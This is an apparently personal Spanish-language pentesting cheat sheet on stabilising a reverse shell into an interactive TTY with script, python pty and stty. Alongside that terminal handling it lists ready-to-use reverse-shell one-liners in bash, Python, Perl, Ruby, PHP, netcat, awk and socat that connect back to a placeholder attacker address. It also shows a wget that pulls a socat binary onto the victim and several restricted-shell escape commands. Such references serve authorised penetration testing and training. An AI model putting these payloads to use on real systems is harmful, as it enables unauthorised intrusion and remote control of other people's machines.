# Tratamiento de TTY / Shell Interactiva

Tags: #TTY #Shell #ReverseShell #Meterpreter #Linux #Interactiva

## OBJETIVO

- Estabilizar una reverse shell inestable → shell completamente interactiva
- Habilitar Ctrl+C, Ctrl+L, flechas, autocompletado y vim/nano

## TIPS

1. **Sin tratamiento de TTY → Ctrl+C mata la shell → no hay historial → vim no funciona**
2. **script /dev/null -c bash → el método más limpio y rápido**
3. **Si script falla → usar python3 -c 'import pty...' como alternativa**
4. **Ajustar dimensiones stty SIEMPRE → sin esto vim/nano se verá mal**
5. **stty raw -echo → deshabilita el echo local → permite Ctrl+C sin matar la shell**

---

## MÉTODO PRINCIPAL — script + stty

```bash
# PASO 1 → Estabilizar la shell
❯ script /dev/null -c bash
# Inicia un proceso bash limpio con TTY

# Si script no está disponible → alternativa con Python
❯ python3 -c 'import pty;pty.spawn("/bin/bash")'
❯ python -c 'import pty;pty.spawn("/bin/bash")'    # Python 2

# PASO 2 → Configurar variables de entorno
❯ export SHELL=bash
# o
❯ export SHELL=/bin/bash
# Necesario si $SHELL vale /usr/bin/nologin u otro valor no interactivo

❯ export TERM=xterm
# Habilita: Ctrl+C, Ctrl+L (limpiar), flechas

❯ export TERM=xterm-256color
# Igual que xterm pero con colores en la terminal
❯ source /etc/skel/.bashrc
# Aplicar colores y configuración bash completa

# PASO 3 → Resetear la TTY desde Kali (suspender la shell primero)
# Presionar: Ctrl + Z  (suspende la shell)
❯ stty raw -echo; fg
# stty raw → modo raw → pasa las teclas directamente
# -echo → deshabilita el eco local → Ctrl+C no mata la shell
# fg → retomar la shell en primer plano

❯ reset xterm
# Resetear el terminal → aplica la configuración completa

# PASO 4 → Ajustar dimensiones (OBLIGATORIO para vim/nano)
# En Kali → obtener dimensiones actuales
❯ stty size
# Devuelve: filas columnas (ej: 51 189)

# En la shell comprometida → aplicar las mismas dimensiones
❯ stty rows 51 columns 189
# Ajustar a los valores de tu terminal de Kali
```

---

## MÉTODO ALTERNATIVO — socat (shell completamente interactiva desde el inicio)

```bash
# En Kali → levantar listener con socat
❯ socat file:`tty`,raw,echo=0 tcp-listen:4444

# En la víctima → conectar con socat
❯ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP_KALI>:4444
# Da una TTY completamente interactiva desde el primer momento
# No necesita tratamiento adicional

# Si socat no está en la víctima → subir el binario estático
❯ wget http://<IP_KALI>/socat -O /tmp/socat
❯ chmod +x /tmp/socat
❯ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP_KALI>:4444
```

---

## MÉTODO RLWRAP — para shells básicas sin TTY

```bash
# En Kali → usar rlwrap con netcat
❯ rlwrap nc -nlvp 443
# rlwrap → añade historial, flechas y autocompletado a la shell
# No da TTY completa pero mejora mucho la experiencia
# Útil cuando no puedes hacer el tratamiento completo
```

---

## OBTENER SHELL INTERACTIVA — One-liners por lenguaje

### Bash

```bash
❯ /bin/bash -i
# Shell bash interactiva → funciona desde Meterpreter

❯ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
# Reverse shell bash → TCP

❯ 0<&196;exec 196<>/dev/tcp/<IP_KALI>/443; bash <&196 >&196 2>&196
# Reverse shell alternativa cuando el anterior falla
```

### Python

```bash
❯ python3 -c 'import pty;pty.spawn("/bin/bash")'
# Shell interactiva → no da reverse shell, mejora la actual

❯ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP_KALI>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
# Reverse shell Python3

❯ python -c 'import pty;pty.spawn("/bin/bash")'
# Python 2 → verificar versión con python --version
```

### Perl

```bash
❯ perl -e 'exec "/bin/bash";'
# Shell interactiva desde Meterpreter

❯ perl: exec "/bin/bash";
# Alternativa dentro de intérprete Perl

❯ perl -e 'use Socket;$i="<IP_KALI>";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
# Reverse shell Perl
```

### Ruby

```bash
❯ ruby: exec "/bin/bash"
# Shell interactiva desde intérprete Ruby

❯ ruby -e 'exec "/bin/bash"'
# Shell interactiva desde línea de comandos

❯ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP_KALI>","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
# Reverse shell Ruby
```

### PHP

```bash
❯ php -r '$sock=fsockopen("<IP_KALI>",443);exec("/bin/bash -i <&3 >&3 2>&3");'
# Reverse shell PHP → útil en webshells

❯ php -r 'system("/bin/bash -i");'
# Shell interactiva si PHP está disponible
```

### Netcat

```bash
❯ nc -e /bin/bash <IP_KALI> 443
# Reverse shell netcat con -e (no siempre disponible)

❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP_KALI> 443 >/tmp/f
# Reverse shell netcat sin -e → mkfifo → más compatible

❯ nc -nlvp 443
# Listener en Kali para recibir la reverse shell
```

### Awk

```bash
❯ awk 'BEGIN {system("/bin/bash")}'
# Shell interactiva con awk

❯ awk 'BEGIN{s="/inet/tcp/0/<IP_KALI>/443";while(42){do{printf "shell>" |& s; s |& getline c; print c; while((c |& getline) > 0) print |& s; close(c)}while(c!="exit") close(s)}}'
# Reverse shell awk
```

### Lua

```bash
❯ lua -e 'os.execute("/bin/bash")'
# Shell interactiva con Lua
```

### Otros métodos de escape de shell restringida

```bash
❯ vim -c ':!/bin/bash'
# Escapar desde vim → útil en jail shells

❯ vi -c ':!/bin/bash'
# Alternativa con vi

❯ less /etc/passwd
❯ !/bin/bash
# Desde less → escribir !comando para ejecutar

❯ man cualquier_cosa
❯ !/bin/bash
# Desde man → igual que less

❯ find . -exec /bin/bash \; -quit
# Escape con find

❯ nmap --interactive
❯ !sh
# Versiones antiguas de nmap
```

---

## VERIFICAR SHELLS DISPONIBLES EN LA VÍCTIMA

```bash
❯ cat /etc/shells
# Ver shells instaladas → elegir la disponible

❯ which bash
❯ which sh
❯ which zsh
❯ which dash
# Verificar qué shells están en el PATH
```

---

## AJUSTE DE DIMENSIONES — REFERENCIA RÁPIDA

```bash
# En Kali → obtener dimensiones actuales
❯ stty size
# Output: filas columnas

# En la shell comprometida → aplicar
❯ stty rows <filas> columns <columnas>

# Ejemplo
❯ stty rows 51 columns 189

# Ajustar tamaño del monitor en Kali si es necesario
❯ xrandr -s 1
# Win + Shift + R → recargar en Kitty
```

---

## FLUJO COMPLETO RESUMIDO

```
1. Recibir reverse shell con nc -nlvp 443

2. Estabilizar:
   script /dev/null -c bash
   (o python3 -c 'import pty;pty.spawn("/bin/bash")')

3. Configurar:
   export SHELL=bash
   export TERM=xterm-256color
   source /etc/skel/.bashrc

4. Resetear desde Kali:
   Ctrl + Z
   stty raw -echo; fg
   reset xterm

5. Ajustar dimensiones:
   stty rows <N> columns <N>
   (valores de tu terminal de Kali)
```